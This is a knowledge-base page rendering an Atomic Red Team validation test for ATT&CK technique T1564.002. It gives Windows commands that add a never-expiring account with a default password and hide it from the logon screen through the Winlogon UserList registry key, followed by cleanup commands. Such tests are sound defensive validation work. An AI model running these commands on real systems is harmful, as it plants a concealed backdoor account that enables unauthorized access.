---
atomic_guid: "173126b7-afe4-45eb-8680-fa9f6400431c"
title: "Create Hidden User in Registry"
framework: "atomic"
generated: "true"
attack_technique_id: "T1564.002"
attack_technique_name: "Hide Artifacts: Hidden Users"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.002/T1564.002.yaml"
build_date: "2026-04-26 17:02:13"
executor: "command_prompt"
aliases:
  - "173126b7-afe4-45eb-8680-fa9f6400431c"
  - "Create Hidden User in Registry"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Create Hidden User in Registry

Adversaries may similarly hide user accounts in Windows. Adversaries can set the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen.
Reference https://attack.mitre.org/techniques/T1564/002/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/

## Metadata

- Atomic GUID: 173126b7-afe4-45eb-8680-fa9f6400431c
- Technique: T1564.002: Hide Artifacts: Hidden Users
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1564.002/T1564.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1564-hide_artifacts|T1564.002]]

## Input Arguments

### user_name

- description: Username
- type: string
- default: AtomicOperator

### user_password

- description: Password for new user account
- type: string
- default: At0micRedTeam!

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
NET USER #{user_name}$ #{user_password} /ADD /expires:never 
REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v #{user_name}$ /t REG_DWORD /d 0
```

### Cleanup

```cmd
reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v #{user_name}$ /f >nul 2>&1
net user ${user_name}$ /delete >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.002/T1564.002.yaml)
